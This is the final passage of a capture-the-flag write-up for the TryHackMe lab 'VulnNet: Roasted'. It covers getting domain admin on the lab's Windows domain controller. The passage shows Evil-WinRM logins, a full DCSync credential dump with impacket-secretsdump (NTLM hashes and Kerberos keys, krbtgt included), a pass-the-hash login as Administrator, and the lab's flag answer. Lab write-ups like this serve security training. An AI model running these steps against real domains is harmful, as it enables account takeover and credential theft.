Wscript.Echo "and password expired for user " & strUserNTName 
```

### WinRM connection attempt as "a-whitehat"
```
evil-winrm -i TARGET_IP_ADDRESS -u a-whitehat -p 'bNdKVkjv3RR9ht'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\a-whitehat\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled

*Evil-WinRM* PS C:\Users\a-whitehat\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                         Type             SID                                          Attributes
================================================== ================ ============================================ ===============================================================
Everyone                                           Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                                      Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access         Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                             Alias            S-1-5-32-544                                 Mandatory group, Enabled by default, Enabled group, Group owner
NT AUTHORITY\NETWORK                               Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users                   Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                     Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
VULNNET-RST\Domain Admins                          Group            S-1-5-21-1589833671-435344116-4136949213-512 Mandatory group, Enabled by default, Enabled group
VULNNET-RST\Denied RODC Password Replication Group Alias            S-1-5-21-1589833671-435344116-4136949213-572 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication                   Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level               Label            S-1-16-12288
```

**Notes**  

* Despite being domain admin, `system.txt` on Administrator Desktop still not accessible

**Action(s)**  
:white_check_mark: Use domain admin credentials to perform a DC sync attack to obtain the password hash for the Administrator account to use in a pass-the-hash attack

### DC Sync attack
```
impacket-secretsdump vulnnet-rst.local/a-whitehat@TARGET_IP_ADDRESS
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xf10a2788aef5f622149a41b2c745f49a
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
VULNNET-RST\WIN-2BO8M1OE1M1$:aes256-cts-hmac-sha1-96:79a193ecf109f893e53dce408505f318384e257f8a64f558d36c5889126cd0a2
VULNNET-RST\WIN-2BO8M1OE1M1$:aes128-cts-hmac-sha1-96:184c02d07eb4211c3a7aae752f2ecec0
VULNNET-RST\WIN-2BO8M1OE1M1$:des-cbc-md5:76b6c1013246193e
VULNNET-RST\WIN-2BO8M1OE1M1$:plain_password_hex:cbb72c75ef92003d30f9d207a690017ce13ebc38bc2733e9f5336f9d825f42c5cae4b1c81890900a9e547584d3655ba7dc917197bba907cdb805efaa8cef05bbec2b921ecaed5e81f0102424dd6714d023c2395cfdcf3de72cf6628193e83533d7f7f33ce012854af35adac966f922395d16299b045f7ac4c0026ec143db7ede08e56111445918d04ece6d12ef2dd305494a67a2fc7db895de7e3f3d9aa1b901010c9d916025730d1ac6d8b02b2d70408d784d7e0f441cb6cbdd08774ddb8f642e06c13ef0f3dac45f8acf24da13f912d92bc32e90ef61e4e0fcc5d0951f23855bb9f7eb4ec72b86bceeb1a951946600
VULNNET-RST\WIN-2BO8M1OE1M1$:aad3b435b51404eeaad3b435b51404ee:9358aefc0e17669db8ca1dcb73fb880d:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x20809b3917494a0d3d5de6d6680c00dd718b1419
dpapi_userkey:0xbf8cce326ad7bdbb9bbd717c970b7400696d3855
[*] NL$KM 
 0000   F3 F6 6B 8D 1E 2A F4 8E  85 F6 7A 46 D1 25 A0 D3   ..k..*....zF.%..
 0010   EA F4 90 7D 2D CB A5 8C  88 C5 68 4C 1E D3 67 3B   ...}-.....hL..g;
 0020   DB 31 D9 91 C9 BB 6A 57  EA 18 2C 90 D3 06 F8 31   .1....jW..,....1
 0030   7C 8C 31 96 5E 53 5B 85  60 B4 D5 6B 47 61 85 4A   |.1.^S[.`..kGa.J
NL$KM:f3f66b8d1e2af48e85f67a46d125a0d3eaf4907d2dcba58c88c5684c1ed3673bdb31d991c9bb6a57ea182c90d306f8317c8c31965e535b8560b4d56b4761854a
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7633f01273fc92450b429d6067d1ca32:::
vulnnet-rst.local\enterprise-core-vn:1104:aad3b435b51404eeaad3b435b51404ee:8752ed9e26e6823754dce673de76ddaf:::
vulnnet-rst.local\a-whitehat:1105:aad3b435b51404eeaad3b435b51404ee:1bd408897141aa076d62e9bfc1a5956b:::
vulnnet-rst.local\t-skid:1109:aad3b435b51404eeaad3b435b51404ee:49840e8a32937578f8c55fdca55ac60b:::
vulnnet-rst.local\j-goldenhand:1110:aad3b435b51404eeaad3b435b51404ee:1b1565ec2b57b756b912b5dc36bc272a:::
vulnnet-rst.local\j-leet:1111:aad3b435b51404eeaad3b435b51404ee:605e5542d42ea181adeca1471027e022:::
WIN-2BO8M1OE1M1$:1000:aad3b435b51404eeaad3b435b51404ee:9358aefc0e17669db8ca1dcb73fb880d:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:7f9adcf2cb65ebb5babde6ec63e0c8165a982195415d81376d1f4ae45072ab83
Administrator:aes128-cts-hmac-sha1-96:d9d0cc6b879ca5b7cfa7633ffc81b849
Administrator:des-cbc-md5:52d325cb2acd8fc1
krbtgt:aes256-cts-hmac-sha1-96:a27160e8a53b1b151fa34f45524a07eb9899ebdf0051b20d677f0c3b518885bd
krbtgt:aes128-cts-hmac-sha1-96:75c22aac8f2b729a3a5acacec729e353
krbtgt:des-cbc-md5:1357f2e9d3bc0bd3
vulnnet-rst.local\enterprise-core-vn:aes256-cts-hmac-sha1-96:9da9e2e1e8b5093fb17b9a4492653ceab4d57a451bd41de36b7f6e06e91e98f3
vulnnet-rst.local\enterprise-core-vn:aes128-cts-hmac-sha1-96:47ca3e5209bc0a75b5622d20c4c81d46
vulnnet-rst.local\enterprise-core-vn:des-cbc-md5:200e0102ce868016
vulnnet-rst.local\a-whitehat:aes256-cts-hmac-sha1-96:f0858a267acc0a7170e8ee9a57168a0e1439dc0faf6bc0858a57687a504e4e4c
vulnnet-rst.local\a-whitehat:aes128-cts-hmac-sha1-96:3fafd145cdf36acaf1c0e3ca1d1c5c8d
vulnnet-rst.local\a-whitehat:des-cbc-md5:028032c2a8043ddf
vulnnet-rst.local\t-skid:aes256-cts-hmac-sha1-96:a7d2006d21285baee8e46454649f3bd4a1790c7f4be7dd0ce72360dc6c962032
vulnnet-rst.local\t-skid:aes128-cts-hmac-sha1-96:8bdfe91cca8b16d1b3b3fb6c02565d16
vulnnet-rst.local\t-skid:des-cbc-md5:25c2739dcb646bfd
vulnnet-rst.local\j-goldenhand:aes256-cts-hmac-sha1-96:fc08aeb44404f23ff98ebc3aba97242155060928425ec583a7f128a218e4c5ad
vulnnet-rst.local\j-goldenhand:aes128-cts-hmac-sha1-96:7d218a77c73d2ea643779ac9b125230a
vulnnet-rst.local\j-goldenhand:des-cbc-md5:c4e65d49feb63180
vulnnet-rst.local\j-leet:aes256-cts-hmac-sha1-96:1327c55f2fa5e4855d990962d24986b63921bd8a10c02e862653a0ac44319c62
vulnnet-rst.local\j-leet:aes128-cts-hmac-sha1-96:f5d92fe6dc0f8e823f229fab824c1aa9
vulnnet-rst.local\j-leet:des-cbc-md5:0815580254a49854
WIN-2BO8M1OE1M1$:aes256-cts-hmac-sha1-96:79a193ecf109f893e53dce408505f318384e257f8a64f558d36c5889126cd0a2
WIN-2BO8M1OE1M1$:aes128-cts-hmac-sha1-96:184c02d07eb4211c3a7aae752f2ecec0
WIN-2BO8M1OE1M1$:des-cbc-md5:2526f2548f49852a
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[-] SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running services are dependent on.
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
```

### Pass-the-hash attack
```
evil-winrm -i TARGET_IP_ADDRESS -u Administrator -H c2597747aa5e43022a3a3049a3c3b09d 
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type system.txt
```
??? success "What is the system flag? (Desktop\system.txt)"
	THM{16f45e3934293a57645f8d7bf71d8d4c}

**Tools Used**  
`smbclient` `impacket-GetNPUsers` `crackmapexec` `john` `impacket-GetUserSPNs` `evil-winrm` `impacket-secretsdump`

**Date completed:** 13/06/26  
**Date published:** 13/06/26